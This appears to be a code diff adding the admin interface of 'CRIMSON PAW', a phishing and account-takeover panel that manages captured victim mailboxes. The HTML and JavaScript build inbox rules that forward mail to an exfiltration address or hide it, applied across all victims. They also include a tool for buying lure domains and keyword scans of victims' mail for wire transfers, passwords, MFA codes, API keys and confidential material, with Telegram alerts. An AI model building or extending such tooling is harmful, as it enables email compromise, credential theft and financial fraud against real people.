+                                <input type="email" id="new-rule-forward-email" class="owa-input" placeholder="e.g. drop@exfil-domain.com">
+                            </div>
+
+                            <div id="new-rule-folder-row" style="display:none;">
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Target Folder (all mailbox folders)</label>
+                                <select id="new-rule-target-folder" class="owa-select" style="width:100%;">
+                                    <option value="deleteditems">Deleted Items</option>
+                                    <option value="archive">Archive</option>
+                                    <option value="junkemail">Junk Email</option>
+                                </select>
+                            </div>
+
+                            <div style="margin-top:6px; padding:8px 12px; background:#f0f7ff; border:1px solid #c7e0f4; border-radius:4px;">
+                                <label style="display:flex; align-items:center; gap:8px; font-size:12px; font-weight:600; color:#005a9e; cursor:pointer; margin:0;">
+                                    <input type="checkbox" id="new-rule-all-inboxes" style="width:16px; height:16px; accent-color:#0078d4;">
+                                    <span>🌐 Apply this rule to ALL captured victim inboxes simultaneously</span>
+                                </label>
+                            </div>
+
+                            <div style="display:flex; justify-content:flex-end; gap:8px; margin-top:8px;">
+                                <button type="button" class="owa-secondary-btn" onclick="closeNewRuleForm()">Cancel</button>
+                                <button type="button" class="owa-primary-btn" id="btn-save-new-rule" onclick="saveNewInboxRule()">Save rule</button>
+                            </div>
+                        </div>
+
+                        <div id="rules-content">Loading inbox rules...</div>
+                    </div>
+
+                    <!-- Tab 3: Language & Time -->
+                    <div id="settings-tab-general" class="settings-tab-pane" style="display:none;">
+                        <div class="owa-settings-section-title">Language and time settings</div>
+                        <div class="owa-settings-section-desc">Manage display language, current timezone, date format, and time format.</div>
+                        <div id="general-content">Loading mailbox settings...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Genuine Microsoft Outlook Web Attachment Preview Modal -->
+    <div id="outlookAttachmentPreviewModal" class="modal-overlay" style="align-items: center; justify-content: center; z-index: 10005;">
+        <div class="owa-preview-container">
+            <div class="owa-preview-header">
+                <div class="owa-preview-title">
+                    <span id="preview-file-icon">📎</span>
+                    <span id="preview-file-name" style="font-weight:600; color:#201f1e; margin-left:6px;">Attachment</span>
+                    <span id="preview-file-size" style="font-size:12px; font-weight:400; color:#605e5c; margin-left:8px;"></span>
+                </div>
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <button type="button" class="owa-primary-btn" id="preview-modal-download-btn" style="height:32px; padding:0 14px; font-size:13px;" title="Download attachment">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                        <span>Download</span>
+                    </button>
+                    <button type="button" class="owa-win-btn close" title="Close preview" onclick="closeAttachmentPreviewModal()">✕</button>
+                </div>
+            </div>
+            <div id="preview-modal-body" class="owa-preview-body">
+                <!-- Preview injected dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Buy Domains & DNS Modal ── -->
+    <div id="buyDomainsModal" class="modal-overlay">
+        <div class="dm-modal">
+            <div class="dm-header">
+                <div class="dm-title">
+                    <span>🛒</span> Domain Store & DNS Manager
+                </div>
+                <button class="close-btn" style="color:#a49498;" onclick="closeBuyDomainsModal()">&times;</button>
+            </div>
+            <div class="dm-tabs">
+                <button type="button" class="dm-tab-btn active" id="tab-btn-search" onclick="switchDomainTab('search')">🔍 Search & Buy (Namecheap)</button>
+                <button type="button" class="dm-tab-btn" id="tab-btn-owned" onclick="switchDomainTab('owned')">📋 Owned Domains & DNS</button>
+                <button type="button" class="dm-tab-btn" id="tab-btn-manual" onclick="switchDomainTab('manual')">➕ Add Custom Domain</button>
+            </div>
+            <div class="dm-body">
+                <!-- TAB 1: Search & Buy -->
+                <div id="dm-tab-pane-search" style="display:flex; flex-direction:column; gap:14px;">
+                    <div style="background:#161014; border:1px solid #38161b; border-radius:8px; padding:12px 14px; font-size:0.78rem; color:#d0c2c6;">
+                        💡 <strong>Real-time Namecheap Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your CRIMSON PAW infrastructure with automated DNS binding.
+                    </div>
+                    <div class="dm-search-bar">
+                        <input type="text" id="dm-search-keyword" class="dm-input" placeholder="Enter keyword or domain (e.g. secure-verify or account-auth)" onkeydown="if(event.key==='Enter') searchDomains()">
+                        <button type="button" class="dm-btn" onclick="searchDomains()"><span>🔍</span> Search</button>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+                        <span style="font-size:0.73rem; font-weight:700; color:#a49498; text-transform:uppercase;">TLD Filters:</span>
+                        <div class="dm-tld-chips">
+                            <label class="dm-tld-chip"><input type="checkbox" value="com" checked> .com</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="net" checked> .net</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="org"> .org</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="info" checked> .info</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="xyz" checked> .xyz</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="io"> .io</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="co"> .co</label>
+                            <label class="dm-tld-chip"><input type="checkbox" value="app"> .app</label>
+                        </div>
+                    </div>
+                    <div id="dm-search-loading" style="display:none; text-align:center; padding:25px; color:#ff6b72;">
+                        ⏳ Querying Namecheap API availability & pricing...
+                    </div>
+                    <div id="dm-search-results-box" style="display:none;">
+                        <table class="dm-results-table">
+                            <thead>
+                                <tr>
+                                    <th>Domain Name</th>
+                                    <th>Status</th>
+                                    <th>Price / Year</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="dm-search-results-tbody">
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- TAB 2: Owned Domains -->
+                <div id="dm-tab-pane-owned" style="display:none; flex-direction:column; gap:12px;">
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <span style="font-size:0.8rem; font-weight:700; color:#f0ebed;">Registered & Active Domains</span>
+                        <button type="button" class="dm-btn dm-btn-secondary" onclick="loadOwnedDomainsTable()" style="padding:6px 12px; font-size:0.75rem;">🔄 Refresh</button>
+                    </div>
+                    <table class="dm-results-table">
+                        <thead>
+                            <tr>
+                                <th>Domain</th>
+                                <th>Registrar</th>
+                                <th>Nameservers</th>
+                                <th>Added Date</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="dm-owned-domains-tbody">
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- TAB 3: Add Custom Domain -->
+                <div id="dm-tab-pane-manual" style="display:none; flex-direction:column; gap:14px;">
+                    <div style="background:#161014; border:1px solid #38161b; border-radius:8px; padding:12px 14px; font-size:0.78rem; color:#d0c2c6;">
+                        🌐 <strong>Bring Your Own Domain:</strong> Point your domain's DNS (A Record or Cloudflare Tunnel) to your CRIMSON PAW server and register it here to immediately use it in the deployment builder.
+                    </div>
+                    <div style="display:flex; flex-direction:column; gap:6px;">
+                        <label style="font-size:0.74rem; font-weight:700; color:#a49498; text-transform:uppercase;">Domain Name</label>
+                        <input type="text" id="dm-custom-domain-name" class="dm-input" placeholder="e.g. portal-auth.com">
+                    </div>
+                    <div style="display:flex; flex-direction:column; gap:6px;">
+                        <label style="font-size:0.74rem; font-weight:700; color:#a49498; text-transform:uppercase;">Registrar / Provider</label>
+                        <input type="text" id="dm-custom-provider" class="dm-input" placeholder="e.g. Cloudflare, GoDaddy, Namecheap" value="Manual DNS">
+                    </div>
+                    <div style="display:flex; justify-content:flex-end; margin-top:8px;">
+                        <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to CRIMSON PAW</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Deleted Domains Modal ── -->
+    <div id="deletedDomainsModal" class="modal-overlay">
+        <div class="dm-modal" style="max-width:700px;">
+            <div class="dm-header">
+                <div class="dm-title">
+                    <span>🗑️</span> Deleted Domains & Retirements
+                </div>
+                <button class="close-btn" style="color:#a49498;" onclick="closeDeletedDomainsModal()">&times;</button>
+            </div>
+            <div class="dm-body">
+                <div style="font-size:0.78rem; color:#a49498;">Review archived or deleted domains and deployments.</div>
+                <table class="dm-results-table">
+                    <thead>
+                        <tr>
+                            <th>Domain / Deployment</th>
+                            <th>Status</th>
+                            <th>Date</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dm-deleted-tbody">
+                        <tr><td colspan="4" style="text-align:center; color:#a49498; padding:20px;">No deleted domains in archive.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+        <script>
+        function toggleSidebar() {
+            const sb = document.getElementById('sidebar');
+            sb.classList.toggle('collapsed');
+            const btn = document.getElementById('sidebar-toggle-btn');
+            if (btn) {
+                btn.innerHTML = sb.classList.contains('collapsed') ? '❯' : '❮';
+                btn.title = sb.classList.contains('collapsed') ? 'Expand sidebar' : 'Collapse sidebar';
+            }
+        }
+
+        function handleBrandLogoClick() {
+            if (currentUserRole === 'operator' || window.location.pathname.startsWith('/m/')) {
+                window.location.reload();
+            } else {
+                window.location.href = '/';
+            }
+        }
+
+        function copyCurrentOperatorAccountInfo() {
+            const data = window._currentOperatorData || {};
+            const username = data.username || currentUsername || 'Operator';
+            const token = data.operator_token || '';
+            const portalUrl = token ? (window.location.origin + '/m/' + token) : (window.location.origin + '/login');
+            const sessions = data.assigned_sessions || [];
+            const inboxes = sessions.length > 0 ? `${sessions.length} victim inbox(es) (${sessions.join(', ')})` : 'All delegated victim accounts';
+
+            const infoText = 
+`CRIMSON PAW • Operator Account Info
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Operator Name : ${username}
+Portal Link   : ${portalUrl}
+Assigned      : ${inboxes}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+            navigator.clipboard.writeText(infoText).then(() => {
+                showToast('✓ Operator account info copied to clipboard!');
+            }).catch(() => {
+                showToast('Operator: ' + username + ' | ' + portalUrl);
+            });
+        }
+
+        let currentUserRole = 'admin';
+        let currentUsername = 'admin';
+
+        function showPage(id, el) {
+            if (currentUserRole === 'operator' && id !== 'mailbox') {
+                id = 'mailbox';
+            }
+            if (currentUserRole !== 'operator') {
+                try { localStorage.setItem('crimson_active_page', id); } catch(e){}
+            }
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            const p = document.getElementById('page-' + id);
+            if (p) p.classList.add('active');
+            
+            if (el) {
+                el.classList.add('active');
+            } else if (window.event && window.event.currentTarget) {
+                window.event.currentTarget.classList.add('active');
+            } else {
+                const nav = document.querySelector(`.nav-item[onclick*="${id}"]`);
+                if (nav) nav.classList.add('active');
+            }
+
+            if (id === 'mailbox') {
+                loadMailboxSessions();
+            } else if (id === 'extractor') {
+                loadExtractorSessions();
+            } else if (id === 'b2b') {
+                loadB2BSessions();
+                loadB2BCampaignCount();
+                updateB2BLivePreview();
+            } else if (id === 'dashboard') {
+                loadDashboard();
+            } else if (id === 'links') {
+                initLinkGenerator();
+            } else if (id === 'templates') {
+                loadTemplatesGrid();
+                initLinkGenerator();
+            } else if (id === 'sessions') {
+                loadSessions();
+            } else if (id === 'settings') {
+                loadSettings();
+            } else if (id === 'operators') {
+                loadOperators();
+            } else if (id === 'keyword-alerts') {
+                loadKeywordAlertsData();
+            }
+        }
+
+        /* ── Keyword Alerts JS Logic ────────────────────────────────────────── */
+        let kwaCachedMatches = [];
+        let kwaRules = [];
+
+        async function loadKeywordAlertsData() {
+            try {
+                // 1. Load Stats
+                const statsRes = await fetch('/api/keyword_alerts/stats');
+                if (statsRes.ok) {
+                    const stats = await statsRes.json();
+                    const elRules = document.getElementById('kwa-stat-rules');
+                    const elVictims = document.getElementById('kwa-stat-victims');
+                    const elHits = document.getElementById('kwa-stat-hits');
+                    const elCrit = document.getElementById('kwa-stat-critical');
+                    if (elRules) elRules.textContent = stats.active_rules || 0;
+                    if (elVictims) elVictims.textContent = stats.monitored_victims_with_hits || 0;
+                    if (elHits) elHits.textContent = stats.total_matches || 0;
+                    if (elCrit) elCrit.textContent = stats.critical_matches || 0;
+                    
+                    const badge = document.getElementById('nav-badge-keywords');
+                    if (badge) {
+                        const untriaged = stats.untriaged_matches || 0;
+                        if (untriaged > 0) {
+                            badge.textContent = untriaged > 99 ? '99+' : untriaged;
+                            badge.style.display = 'inline-block';
+                        } else {
+                            badge.style.display = 'none';
+                        }
+                    }
+                }
+
+                // 2. Populate account dropdowns from sessions
+                const sessRes = await fetch('/api/sessions');
+                if (sessRes.ok) {
+                    const sessions = await sessRes.json();
+                    const captured = Array.isArray(sessions) ? sessions.filter(s => s.status === 'CAPTURED') : [];
+                    
+                    const filterSel = document.getElementById('kwa-filter-account');
+                    const ruleSel = document.getElementById('kwa-rule-account');
+                    if (filterSel && ruleSel) {
+                        const currentFilterVal = filterSel.value;
+                        const currentRuleVal = ruleSel.value;
+
+                        filterSel.innerHTML = '<option value="ALL">All Victims</option>';
+                        ruleSel.innerHTML = '<option value="all">All Captured Accounts</option>';
+
+                        captured.forEach(s => {
+                            const label = `${s.victim_name || 'Victim'} (${s.victim_email || s.user_code})`;
+                            filterSel.innerHTML += `<option value="${s.user_code}">${escapeHtml(label)}</option>`;
+                            ruleSel.innerHTML += `<option value="${s.user_code}">${escapeHtml(label)}</option>`;
+                        });
+
+                        if (currentFilterVal) filterSel.value = currentFilterVal;
+                        if (currentRuleVal) ruleSel.value = currentRuleVal;
+                    }
+                }
+
+                // 3. Load rules and matches
+                await loadKeywordRules();
+                await loadKeywordMatches();
+            } catch (err) {
+                console.error("Error loading keyword alerts data:", err);
+            }
+        }
+
+        async function loadKeywordRules() {
+            try {
+                const res = await fetch('/api/keyword_alerts/rules');
+                if (!res.ok) return;
+                const data = await res.json();
+                kwaRules = data.rules || [];
+                const countEl = document.getElementById('kwa-rules-count');
+                if (countEl) countEl.textContent = kwaRules.length;
+
+                const list = document.getElementById('kwa-rules-list');
+                if (!list) return;
+
+                if (kwaRules.length === 0) {
+                    list.innerHTML = `<div style="padding:24px; text-align:center; color:#8e7d82; font-size:12px;">No rules configured. Click <b>+ Add</b> or choose a preset above.</div>`;
+                    return;
+                }
+
+                let html = '';
+                kwaRules.forEach(r => {
+                    const sev = (r.severity || 'HIGH').toUpperCase();
+                    const badgeClass = `kwa-badge-${sev.toLowerCase()}`;
+                    const active = r.is_active ? true : false;
+                    const kws = Array.isArray(r.keywords) ? r.keywords : [];
+                    const previewKws = kws.slice(0, 4).map(k => `<span style="background:rgba(255,255,255,0.06); padding:1px 6px; border-radius:4px; font-size:10.5px; font-family:monospace; color:#cbd5e1;">${escapeHtml(k)}</span>`).join(' ');
+                    const moreTag = kws.length > 4 ? `<span style="font-size:10px; color:#8e7d82;">+${kws.length - 4} more</span>` : '';
+
+                    html += `
+                        <div class="kwa-rule-card ${active ? '' : 'inactive'}" id="kwa-rule-card-${r.id}">
+                            <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:8px; gap:8px;">
+                                <div>
+                                    <div style="font-weight:700; font-size:13px; color:#ffffff;">${escapeHtml(r.name)}</div>
+                                    <div style="display:flex; align-items:center; gap:6px; margin-top:4px;">
+                                        <span class="kwa-badge ${badgeClass}">${sev}</span>
+                                        <span style="font-size:10.5px; color:#a49498; background:rgba(255,255,255,0.04); padding:1px 6px; border-radius:4px;">${escapeHtml(r.category || 'Custom')}</span>
+                                        <span style="font-size:10.5px; color:#605e5c;">${r.target_account === 'all' ? '🌐 All Victims' : '🎯 1 Victim'}</span>
+                                    </div>
+                                </div>
+                                <div style="display:flex; align-items:center; gap:6px;">
+                                    <input type="checkbox" ${active ? 'checked' : ''} onchange="toggleKeywordRule(${r.id}, this.checked)" title="Toggle Active" style="accent-color:#e50914; cursor:pointer;">
+                                    <button class="ab-action-circle-btn" onclick="openEditKeywordRuleModal(${r.id})" title="Edit Rule" style="width:24px; height:24px; font-size:11px;">✏️</button>
+                                    <button class="ab-action-circle-btn ab-action-delete-btn" onclick="deleteKeywordRule(${r.id})" title="Delete Rule" style="width:24px; height:24px; font-size:11px;">🗑️</button>
+                                </div>
+                            </div>
+                            <div style="display:flex; flex-wrap:wrap; gap:4px; align-items:center;">
+                                ${previewKws} ${moreTag}
+                            </div>
+                        </div>
+                    `;
+                });
+                list.innerHTML = html;
+            } catch (err) {
+                console.error("Error loading keyword rules:", err);
+            }
+        }
+
+        async function loadKeywordMatches() {
+            try {
+                const sev = document.getElementById('kwa-filter-severity')?.value || 'ALL';
+                const acc = document.getElementById('kwa-filter-account')?.value || 'ALL';
+                const triaged = document.getElementById('kwa-filter-triaged')?.value || 'ALL';
+
+                const url = `/api/keyword_alerts/matches?severity=${encodeURIComponent(sev)}&account=${encodeURIComponent(acc)}&triaged=${encodeURIComponent(triaged)}&limit=150`;
+                const res = await fetch(url);
+                if (!res.ok) return;
+                const data = await res.json();
+                kwaCachedMatches = data.matches || [];
+                renderFilteredMatches(kwaCachedMatches);
+            } catch (err) {
+                console.error("Error loading keyword matches:", err);
+            }
+        }
+
+        function filterKeywordMatches() {
+            const query = (document.getElementById('kwa-search-input')?.value || '').toLowerCase().trim();
+            if (!query) {
+                renderFilteredMatches(kwaCachedMatches);
+                return;
+            }
+            const filtered = kwaCachedMatches.filter(m => {
+                const kw = (m.matched_keyword || '').toLowerCase();
+                const subj = (m.email_subject || '').toLowerCase();
+                const vName = (m.victim_name || '').toLowerCase();
+                const vEmail = (m.victim_email || '').toLowerCase();
+                const snip = (m.email_snippet || '').toLowerCase();
+                const sndr = (m.email_sender || '').toLowerCase();
+                return kw.includes(query) || subj.includes(query) || vName.includes(query) || vEmail.includes(query) || snip.includes(query) || sndr.includes(query);
+            });
+            renderFilteredMatches(filtered);
+        }
+
+        function renderFilteredMatches(matches) {
+            const container = document.getElementById('kwa-feed-list');
+            if (!container) return;
+
+            if (matches.length === 0) {
+                container.innerHTML = `
+                    <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; padding:60px 20px; color:#8e7d82;">
+                        <span style="font-size:36px; margin-bottom:12px; opacity:0.6;">🎯</span>
+                        <div style="font-size:15px; font-weight:700; color:#f0ebed;">No Keyword Matches Found</div>
+                        <div style="font-size:12px; margin-top:4px; max-width:400px; text-align:center;">Click <b>▶ Run Scan Now</b> to scan captured mailboxes, or adjust your severity and account filters.</div>
+                    </div>
+                `;
+                return;
+            }
+
+            let html = '';
+            matches.forEach(m => {
+                const sev = (m.rule_severity || 'HIGH').toUpperCase();
+                const badgeClass = `kwa-badge-${sev.toLowerCase()}`;
+                const triaged = m.is_triaged ? true : false;
+                const kwEscaped = escapeHtml(m.matched_keyword || '');
+                
+                // Highlight keyword in snippet
+                let snippetHtml = escapeHtml(m.email_snippet || '');
+                if (m.matched_keyword) {
+                    const regex = new RegExp(`(${escapeRegex(m.matched_keyword)})`, 'gi');
+                    snippetHtml = snippetHtml.replace(regex, '<mark style="background:#e50914; color:#fff; font-weight:800; padding:1px 4px; border-radius:3px;">$1</mark>');
+                }
+
+                html += `
+                    <div class="kwa-match-card ${triaged ? 'triaged' : ''}" id="kwa-match-card-${m.id}">
+                        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+                            <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+                                <span class="kwa-kw-chip">🎯 ${kwEscaped}</span>
+                                <span class="kwa-badge ${badgeClass}">${sev}</span>
+                                <span style="font-size:11px; color:#a49498;">Rule: <strong style="color:#f0ebed;">${escapeHtml(m.rule_name || 'Watchlist')}</strong></span>
+                            </div>
+                            <div style="display:flex; align-items:center; gap:10px; font-size:11.5px; color:#8e7d82;">
+                                <span>🕐 ${escapeHtml(m.received_datetime ? m.received_datetime.replace('T', ' ').slice(0, 16) : m.created_at || '')}</span>
+                            </div>
+                        </div>
+
+                        <!-- Victim identity & Email details -->
+                        <div style="display:flex; align-items:center; gap:10px; background:#10090e; padding:8px 12px; border-radius:6px; border:1px solid #200f13;">
+                            <div style="width:26px; height:26px; border-radius:50%; background:#261115; border:1px solid #4a171d; display:flex; align-items:center; justify-content:center; font-size:12px;">👤</div>
+                            <div style="font-size:12px; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+                                <span style="font-weight:700; color:#ffffff;">${escapeHtml(m.victim_name || 'Victim')}</span>
+                                <span style="color:#58a6ff; font-family:monospace;">${escapeHtml(m.victim_email || m.session_user_code)}</span>
+                                <span style="font-size:10px; background:#1f1317; color:#a49498; padding:1px 6px; border-radius:4px; font-family:monospace;">${escapeHtml(m.session_user_code)}</span>
+                            </div>
+                        </div>
+
+                        <!-- Email Subject & Sender -->
+                        <div>
+                            <div style="font-weight:700; font-size:13.5px; color:#ffffff; display:flex; align-items:center; gap:6px;">
+                                <span>✉️</span> ${escapeHtml(m.email_subject || '(No Subject)')}
+                            </div>
+                            <div style="font-size:11.5px; color:#a49498; margin-top:2px;">
+                                From: <span style="color:#cbd5e1;">${escapeHtml(m.email_sender || 'Unknown Sender')}</span>
+                            </div>
+                        </div>
+
+                        <!-- Snippet preview -->
+                        ${snippetHtml ? `
+                        <div style="font-size:12px; color:#e2e8f0; line-height:1.5; background:#0e080b; padding:10px 14px; border-radius:6px; border-left:3px solid #e50914; font-family:system-ui, sans-serif;">
+                            "${snippetHtml}"
+                        </div>` : ''}
+
+                        <!-- Action buttons -->
+                        <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid #200f13; padding-top:8px; margin-top:2px;">
+                            <div style="display:flex; gap:8px;">
+                                <button type="button" class="btn btn-primary btn-sm" onclick="openMatchInMailbox('${escapeHtml(m.session_user_code)}', '${escapeHtml(m.message_id)}')" style="display:flex; align-items:center; gap:6px;">
+                                    <span>📧</span> View in Mailbox
+                                </button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="copyMatchSnippet('${escapeHtml(m.matched_keyword)}', '${escapeHtml(m.email_subject)}', '${escapeHtml(m.email_snippet)}')">
+                                    📋 Copy
+                                </button>
+                            </div>
+                            <div style="display:flex; gap:6px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="toggleTriageMatch(${m.id}, ${triaged ? 0 : 1})" style="color:${triaged ? '#a49498' : '#3fb950'};">
+                                    ${triaged ? '↩ Mark Unreviewed' : '✓ Mark Triaged'}
+                                </button>
+                                <button type="button" class="btn btn-danger btn-sm" onclick="deleteKeywordMatch(${m.id})" title="Delete hit">
+                                    🗑️
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        async function openMatchInMailbox(userCode, messageId) {
+            if (!userCode) {
+                alert('No session user code associated with this match.');
+                return;
+            }
+
+            window.targetOutlookMessageId = messageId || null;
+            showPage('mailbox');
+            showToast('Opening email in mailbox...');
+
+            const selectEl = document.getElementById('mailbox-session');
+            if (!selectEl || selectEl.options.length <= 1 || selectEl.value !== userCode) {
+                await loadMailboxSessions(userCode);
+            } else {
+                await loadMailbox();
+            }
+        }
+
+        async function toggleKeywordRule(ruleId, isActive) {
+            try {
+                await fetch(`/api/keyword_alerts/rules/${ruleId}/toggle`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ is_active: isActive })
+                });
+                const card = document.getElementById(`kwa-rule-card-${ruleId}`);
+                if (card) card.classList.toggle('inactive', !isActive);
+                loadKeywordAlertsData();
+            } catch (err) {
+                console.error("Error toggling rule:", err);
+            }
+        }
+
+        function openNewKeywordRuleModal() {
+            document.getElementById('kwa-modal-title').innerHTML = '➕ Create Keyword Rule';
+            document.getElementById('kwa-rule-id').value = '';
+            document.getElementById('kwa-rule-name').value = '';
+            document.getElementById('kwa-rule-category').value = 'Custom';
+            document.getElementById('kwa-rule-severity').value = 'HIGH';
+            document.getElementById('kwa-rule-keywords').value = '';
+            document.getElementById('kwa-rule-scope').value = 'all';
+            document.getElementById('kwa-rule-account').value = 'all';
+            document.getElementById('kwa-rule-tg').checked = true;
+            document.getElementById('kwa-rule-wh').checked = true;
+            document.getElementById('kwaRuleModal').classList.add('active');
+        }
+
+        function openEditKeywordRuleModal(ruleId) {
+            const rule = kwaRules.find(r => r.id === ruleId);
+            if (!rule) return;
+            document.getElementById('kwa-modal-title').innerHTML = '✏️ Edit Keyword Rule';
+            document.getElementById('kwa-rule-id').value = rule.id;
+            document.getElementById('kwa-rule-name').value = rule.name || '';
+            document.getElementById('kwa-rule-category').value = rule.category || 'Custom';
+            document.getElementById('kwa-rule-severity').value = rule.severity || 'HIGH';
+            document.getElementById('kwa-rule-keywords').value = Array.isArray(rule.keywords) ? rule.keywords.join(', ') : rule.keywords || '';
+            document.getElementById('kwa-rule-scope').value = rule.search_scope || 'all';
+            document.getElementById('kwa-rule-account').value = rule.target_account || 'all';
+            document.getElementById('kwa-rule-tg').checked = rule.notify_telegram ? true : false;
+            document.getElementById('kwa-rule-wh').checked = rule.notify_webhook ? true : false;
+            document.getElementById('kwaRuleModal').classList.add('active');
+        }
+
+        function closeKeywordRuleModal() {
+            document.getElementById('kwaRuleModal').classList.remove('active');
+        }
+
+        async function saveKeywordRule(e) {
+            e.preventDefault();
+            const ruleId = document.getElementById('kwa-rule-id').value;
+            const name = document.getElementById('kwa-rule-name').value.trim();
+            const category = document.getElementById('kwa-rule-category').value;
+            const severity = document.getElementById('kwa-rule-severity').value;
+            const rawKws = document.getElementById('kwa-rule-keywords').value;
+            const keywords = rawKws.split(',').map(k => k.trim()).filter(k => k.length > 0);
+            const search_scope = document.getElementById('kwa-rule-scope').value;
+            const target_account = document.getElementById('kwa-rule-account').value;
+            const notify_telegram = document.getElementById('kwa-rule-tg').checked;
+            const notify_webhook = document.getElementById('kwa-rule-wh').checked;
+
+            if (keywords.length === 0) {
+                alert("Please enter at least one keyword");
+                return;
+            }
+
+            const payload = {
+                name, category, severity, keywords,
+                search_scope, target_account,
+                notify_telegram, notify_webhook, is_active: 1
+            };
+
+            const url = ruleId ? `/api/keyword_alerts/rules/${ruleId}` : '/api/keyword_alerts/rules';
+            const method = ruleId ? 'PUT' : 'POST';
+
+            try {
+                const res = await fetch(url, {
+                    method: method,
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+                if (res.ok) {
+                    closeKeywordRuleModal();
+                    loadKeywordAlertsData();
+                } else {
+                    const err = await res.json();
+                    alert("Error saving rule: " + (err.error || 'Unknown error'));
+                }
+            } catch (err) {
+                console.error("Save error:", err);
+            }
+        }
+
+        async function deleteKeywordRule(ruleId) {
+            const ok = await appConfirm({
+                title: 'Delete Watchlist Rule',
+                message: 'Are you sure you want to delete this watchlist rule? Future incoming emails will no longer be matched against it.',
+                confirmText: 'Delete Rule',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+            try {
+                await fetch(`/api/keyword_alerts/rules/${ruleId}`, { method: 'DELETE' });
+                showToast('✓ Watchlist rule deleted');
+                loadKeywordAlertsData();
+            } catch (err) {
+                showToast('⚠️ Delete error: ' + err);
+            }
+        }
+
+        function quickApplyPreset(type) {
+            openNewKeywordRuleModal();
+            if (type === 'wire') {
+                document.getElementById('kwa-rule-name').value = 'Financial & Wire Transfers';
+                document.getElementById('kwa-rule-category').value = 'Finance';
+                document.getElementById('kwa-rule-severity').value = 'CRITICAL';
+                document.getElementById('kwa-rule-keywords').value = 'wire transfer, swift, remittance, banking instructions, routing number, bank account, ach transfer, invoice overdue, payment confirmation, beneficiary';
+            } else if (type === 'creds') {
+                document.getElementById('kwa-rule-name').value = 'Credentials & Password Resets';
+                document.getElementById('kwa-rule-category').value = 'Credentials';
+                document.getElementById('kwa-rule-severity').value = 'CRITICAL';
+                document.getElementById('kwa-rule-keywords').value = 'password reset, temporary password, one-time password, otp, verification code, mfa code, 2fa, your new credentials, access token, api key, private key';
+            } else if (type === 'exec') {
+                document.getElementById('kwa-rule-name').value = 'Executive & Confidential';
+                document.getElementById('kwa-rule-category').value = 'Executive';
+                document.getElementById('kwa-rule-severity').value = 'HIGH';
+                document.getElementById('kwa-rule-keywords').value = 'confidential, strictly confidential, non-disclosure agreement, nda, board meeting, merger, acquisition, executive summary, compensation, audit report';
+            } else if (type === 'cloud') {
+                document.getElementById('kwa-rule-name').value = 'Cloud & IT Infrastructure';
+                document.getElementById('kwa-rule-category').value = 'Infrastructure';
+                document.getElementById('kwa-rule-severity').value = 'MEDIUM';
+                document.getElementById('kwa-rule-keywords').value = 'azure portal, aws root, tenant admin, global admin, powershell, firewall rule, domain controller, vpn configuration, ssh key';
+            }
+        }
+
+        async function triggerKeywordScanNow(showAlert = true) {
+            const btn = document.getElementById('kwa-btn-scan-now');
+            const refBtn = document.getElementById('kwa-btn-refresh-feed');
+            const origHtml = btn ? btn.innerHTML : '';
+            if (btn) {
+                btn.innerHTML = `<span>⏳</span> Scanning Inboxes...`;
+                btn.disabled = true;
+            }
+            if (refBtn) {
+                refBtn.style.opacity = '0.5';
+                refBtn.style.pointerEvents = 'none';
+            }
+
+            try {
+                const res = await fetch('/api/keyword_alerts/scan_now', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ account: 'all' })
+                });
+                const data = await res.json();
+                if (res.ok) {
+                    if (showAlert) {
+                        alert(`✓ Inbox Scan Complete!\n• Victims scanned: ${data.scanned_accounts || 0}\n• Total emails inspected: ${data.total_emails_scanned || 0}\n• New intelligence hits detected: ${data.total_new_hits || 0}`);
+                    }
+                    await loadKeywordAlertsData();
+                } else {
+                    if (showAlert) alert("Scan failed: " + (data.error || 'Unknown error'));
+                    await loadKeywordAlertsData();
+                }
+            } catch (err) {
+                console.error("Scan error:", err);
